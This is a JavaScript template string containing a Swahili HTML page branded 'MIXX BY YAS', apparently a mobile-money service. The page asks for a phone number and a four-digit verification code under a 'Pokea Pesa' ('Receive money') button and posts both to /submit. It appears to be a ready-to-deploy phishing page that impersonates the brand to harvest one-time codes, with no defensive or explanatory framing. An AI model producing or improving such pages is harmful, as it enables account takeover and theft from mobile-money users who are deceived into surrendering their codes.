const html = `
<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MIXX BY YAS</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .form-container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 350px; }
        h2 { text-align: center; color: #e30613; }
        label { display: block; margin-top: 15px; font-weight: bold; text-align: center; }
        input[type="tel"] { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 16px; }
        .otp-container {
          display: flex;
          gap: 10px;
          justify-content: center;
          margin: 20px 0;
        }
        .otp-box {
          width: 50px;
          height: 50px;
          text-align: center;
          font-size: 24px;
          border: 2px solid #ccc;
          border-radius: 10px;
          outline: none;
        }
        .otp-box:focus {
          border-color: #e30613;
        }
        button { width: 100%; padding: 12px; margin-top: 10px; background: #e30613; color: white; border: none; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; }
        button:hover { background: #b3050f; }
    </style>
</head>
<body>
    <div class="form-container">
        <h2>MIXX BY YAS</h2>
        <form action="/submit" method="POST" id="otpForm">
            <label for="namba">Weka Namba ya MIXX</label>
            <input type="tel" id="namba" name="namba" placeholder="07XXXXXXXX" required>
            
            <label>Msimbo wa Uthibitisho</label>
            <div class="otp-container">
              <input type="text" maxlength="1" class="otp-box" required>
              <input type="text" maxlength="1" class="otp-box" required>
              <input type="text" maxlength="1" class="otp-box" required>
              <input type="text" maxlength="1" class="otp-box" required>
            </div>
            <input type="hidden" name="msimbo" id="msimboHidden">
            
            <button type="submit">Pokea Pesa</button>
        </form>
    </div>
</body>

<script>
const inputs = document.querySelectorAll('.otp-box');
const form = document.getElementById('otpForm');
const hiddenInput = document.getElementById('msimboHidden');

inputs.forEach((input, index) => {
  input.addEventListener('input', () => {
    if(input.value && index < inputs.length - 1){
      inputs[index + 1].focus();
    }
  });
  input.addEventListener('keydown', (e) => {
    if(e.key === "Backspace" && !input.value && index > 0){
      inputs[index - 1].focus();
    }
  });
});

form.addEventListener('submit', (e) => {
  let code = '';
  inputs.forEach(input => code += input.value);
  hiddenInput.value = code;
});
</script>
</html>
`;
